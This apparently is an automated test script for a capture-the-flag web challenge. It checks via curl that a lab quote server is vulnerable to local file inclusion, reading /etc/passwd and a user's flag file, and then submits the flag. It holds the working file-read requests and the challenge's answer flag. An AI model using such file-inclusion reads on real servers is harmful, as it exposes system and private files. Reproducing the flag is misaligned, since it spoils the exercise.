#!/bin/bash

MATCH=`curl -s "172.20.0.10:8080/" | \
       grep -o "Please specify a quote file to read in the URL path."`
if [[ "$MATCH" == "" ]]
then
    echo "Error - instructions are not returned"
    exit 1
fi

MATCH=`curl -s "172.20.0.10:8080/jobs.txt" | \
       grep -o "We made the buttons on the screen look so good you'll want to lick them."`
if [[ "$MATCH" == "" ]]
then
    echo "Error - quotes are not returned"
    exit 2
fi

MATCH=`curl -s "172.20.0.10:8080/etc/passwd" | \
       grep -o "bob:x:1000:1000::/home/bob:/bin/bash"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - checking LFI with /etc/passwd failed"
    exit 3
fi

MATCH=`curl -s "172.20.0.10:8080/home/bob/flag.txt" | \
       grep -o 'BSY{YouMaySayIamADreamerButIamNotTheOnlyOne}'`
if [[ "$MATCH" == "" ]]
then
    echo "Error - did not find the flag"
    exit 4
fi

# submit a flag in the submission server
RES=`curl -s 'http://172.20.0.3/api/challenges/submit' \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"challenge_id": "famous-quotes", "task_id": "task1", "flag" : "BSY{YouMaySayIamADreamerButIamNotTheOnlyOne}"}'`

if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit the flag - $RES"
  exit 5
fi

echo "OK - tests passed"
